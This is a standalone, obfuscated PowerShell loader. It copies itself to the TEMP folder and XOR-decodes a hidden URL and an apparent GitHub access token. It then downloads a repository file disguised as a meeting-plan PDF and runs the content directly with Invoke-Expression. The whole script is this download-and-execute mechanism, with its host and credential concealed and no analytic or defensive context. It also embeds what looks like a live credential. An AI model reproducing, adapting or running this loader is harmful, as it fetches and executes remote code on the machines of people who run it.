$src = $MyInvocation.MyCommand.Definition
$dst = Join-Path $env:TEMP 'x.ps1'
if ($src -ne $dst -and (Test-Path $src)) {
    Copy-Item $src $dst -Force -EA 0
}
$k=42;$d=[char[]]([byte[]](77,67,94,66,95,72,117,90,75,94,117,27,27,105,107,100,97,97,109,99,26,67,111,120,123,65,29,104,111,114,73,24,73,117,19,88,25,71,66,95,18,71,31,27,90,99,69,65,127,26,89,69,82,65,73,111,68,99,95,88,77,71,83,65,103,69,114,100,25,127,68,92,67,75,124,24,108,107,110,124,114,123,96,100,115,109,107,97,107,126,26,103,104)|%{$_ -bxor $k});$t=-join $d;$e=[char[]]([byte[]](66,94,94,90,89,16,5,5,75,90,67,4,77,67,94,66,95,72,4,73,69,71,5,88,79,90,69,89,5,88,69,94,75,70,72,67,70,70,83,31,7,89,65,79,94,73,66,5,110,88,79,75,71,5,73,69,68,94,79,68,94,89,5,126,88,75,92,79,70,7,103,79,79,94,67,68,77,7,122,70,75,68,7,123,30,7,24,26,24,28,4,90,78,76)|%{$_ -bxor $k});$u=-join $e;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$h=@{};$h.Add("Authorization","token "+$t);$h.Add("Accept","application/vnd.github.raw+json");$r=Invoke-WebRequest -UseBasicParsing -Headers $h -Uri $u;[Text.Encoding]::UTF8.GetString($r.Content)|IEX
